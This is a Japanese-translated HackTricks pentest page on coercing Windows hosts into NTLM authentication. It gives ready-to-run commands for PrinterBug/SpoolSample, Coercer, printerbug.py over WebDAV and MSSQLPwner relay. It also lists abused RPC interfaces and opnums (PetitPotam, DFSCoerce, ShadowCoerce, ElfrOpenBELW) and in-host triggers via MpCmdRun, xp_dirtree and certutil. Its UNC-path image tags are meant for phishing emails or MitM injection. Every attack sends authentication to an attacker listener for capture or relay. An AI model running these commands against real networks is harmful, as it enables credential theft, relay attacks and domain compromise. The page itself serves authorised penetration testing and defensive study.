# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party dependencies を回避するために MIDL compiler を使用して C# で実装された **remote authentication triggers** の **collection** です。

## Spooler Service Abuse

_**Print Spooler**_ service が **enabled** の場合、既知の AD credentials を使用して、Domain Controller の print server に新しい print jobs の **update** を要求し、その通知を任意の **system** に **send** するよう指示できます。\
printer が通知を任意の system に送信する場合、その system に対して **authenticate against** する必要がある点に注意してください。したがって、attacker は _**Print Spooler**_ service に任意の system に対して authenticate させることができ、この authentication では service が **computer account** を使用します。

内部では、classic **PrinterBug** primitive は **`RpcRemoteFindFirstPrinterChangeNotificationEx`** を **`\\PIPE\\spoolss`** 経由で悪用します。attacker はまず printer/server handle を開き、`pszLocalMachine` に fake client name を指定します。これにより、target spooler は **attacker-controlled host** への notification channel を作成します。これが、その影響が direct code execution ではなく **outbound authentication coercion** となる理由です。<sup>[[2]](#references)</sup>\
spooler 自体の **RCE/LPE** を探している場合は、[PrintNightmare](printnightmare.md) を確認してください。このページでは **coercion and relay** に焦点を当てています。

### ドメイン上の Windows Servers を探す

PowerShell を使用して Windows hosts を一覧表示します。Servers は通常、最優先の targets であるため、まずそれらに焦点を当てます:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler services のリスニングを確認

@mysmartlogin (Vincent Le Toux) の [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を少し改変したものを使用して、Spooler Service が listening しているか確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linuxでは`rpcdump.py`も使用して、**MS-RPRN**プロトコルを探します：
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
または、Linux から **NetExec/CrackMapExec** を使ってホストをすばやくテストします：
```bash
nxc smb targets.txt -u user -p password -M spooler
```
spooler endpoint が存在するかどうかを確認するだけでなく、**coercion surface を列挙**したい場合は、**Coercer scan mode**を使用します。<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
これは、EPM で endpoint を確認しただけでは、print RPC interface が登録されていることしか分からないためです。現在の privileges であらゆる coercion method に到達できることや、host が利用可能な authentication flow を発生させることを**保証するものではありません**。

### service に任意の host に対する authentication を要求する

[SpoolSample はここから compile できます](https://github.com/NotMedic/NetNTLMtoSilverTicket)。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linuxを使用している場合は、[**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) か [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) を使用します。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer**を使用すると、spooler interfacesを直接ターゲットにして、どのRPC methodが公開されているかを推測せずに済みます:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClient による SMB ではなく HTTP の強制

Classic PrinterBug では通常、`\\attacker\share` への **SMB** authentication が発生します。これは **capture**、**HTTP targets への relay**、または **SMB signing が存在しない環境への relay** に、依然として有用です。\
しかし、modern environments では、**SMB signing** によって **SMB から SMB への relay** が頻繁にブロックされるため、operators は代わりに **HTTP/WebDAV** authentication を強制することを好みます。

対象で **WebClient** service が実行されている場合、Windows が **HTTP 経由の WebDAV** を使用する形式で listener を指定できます：
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
これは、**`ntlmrelayx --adcs`** やその他の HTTP relay targets と組み合わせる場合に特に有用です。強制された接続で SMB relay が可能であることに依存しないためです。重要な注意点として、HTTP/WebDAV variant を機能させるには、被害端末上で **WebClient が実行中である必要があります**。

### Unconstrained Delegation との組み合わせ

攻撃者が [Unconstrained Delegation](unconstrained-delegation.md) 用に設定されたコンピューターを侵害している場合、そのコンピューターに対して **printer に authentication を強制させる**ことができます。その後、printer computer account の **TGT** は unconstrained-delegation host のメモリに cache され、攻撃者はそれを [Pass the Ticket](pass-the-ticket.md) で取得して再利用できます。

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix（outbound auth を trigger する interfaces/opnums）
- MS-RPRN（Print System Remote Protocol）
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR（Print System Asynchronous Remote）
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 同じ spooler pipe 上の asynchronous print interface。特定の host で到達可能な methods を enumerate するには Coercer を使用します<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR（Encrypting File System Remote Protocol）
- Pipes: \\PIPE\\efsrpc（\\PIPE\\lsarpc、\\PIPE\\samr、\\PIPE\\lsass、\\PIPE\\netlogon 経由でも使用可能）
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM（DFS Namespace Management）
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP（File Server Remote VSS）
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN（EventLog Remoting）
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Note: これらの methods は、UNC path（例: `\\attacker\share`）を格納できる parameters を受け取ります。処理されると、Windows はその UNC に対して（machine/user context で）authenticate するため、NetNTLM capture または relay が可能になります。\
spooler abuse では、protocol specification に `pszLocalMachine` で指定された client への notification channel を server が作成すると明記されているため、**MS-RPRN opnum 65** が現在も最も一般的で、最も文書化された primitive です。<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW（opnum 9）coercion
- Interface: \\PIPE\\even 上の MS-EVEN（IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea）<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target は指定された backup log path を open し、attacker-controlled UNC に authenticate しようとします。<sup>[[1]](#references)</sup>
- Practical use: Tier 0 assets（DC/RODC/Citrix/etc.）に NetNTLM を emit させ、その後 AD CS endpoints（ESC8/ESC11 scenarios）またはその他の privileged services に relay します。<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack は、**Exchange Server の `PushSubscription` feature** に存在する flaw に起因します。この feature により、mailbox を持つ任意の domain user が、Exchange server に対して client が指定した任意の host へ HTTP 経由で authenticate するよう強制できます。

デフォルトでは、**Exchange service は SYSTEM として実行され**、過剰な privileges が付与されています（具体的には、pre-2019 Cumulative Update では domain に対する **WriteDacl privileges** を持ちます）。この flaw は、情報を LDAP に relay し、その後 domain NTDS database を extract できるようにするために悪用できます。LDAP への relay が不可能な場合でも、この flaw を使用して、domain 内の他の hosts に relay して authenticate できます。この attack の exploitation に成功すると、authenticated domain user account だけで Domain Admin に即時 access できます。

## Windows 内部

すでに Windows machine 内部にいる場合、以下を使用して privileged accounts で server に接続するよう Windows に強制できます。

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
または、次の別の technique を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoft-signed binary）を使用して、NTLM authentication を強制できます:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### メール経由

侵害したいマシンにログインするユーザーの**メールアドレス**がわかっている場合、次のような**1x1画像を含むメール**を送信するだけでよいでしょう。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
被害者がそれを開くと、Windowsは認証を試みます。

### MitM

MitM攻撃を実行し、被害者が閲覧するページにHTMLをインジェクトできる場合は、次のような画像をインジェクトしてみてください：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authenticationを強制およびphishするその他の方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1のCracking

[NTLMv1 challengesをcaptureできる場合は、こちらでcrack方法を確認してください](../ntlm/index.html#ntlmv1-attack)。\
_NTLMv1をcrackするには、Responder challengeを "1122334455667788" に設定する必要があることを忘れないでください_

## References

- [1] [Unit 42 – Authentication Coercionは進化し続ける](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx（Opnum 65）](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW（Opnum 9）](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
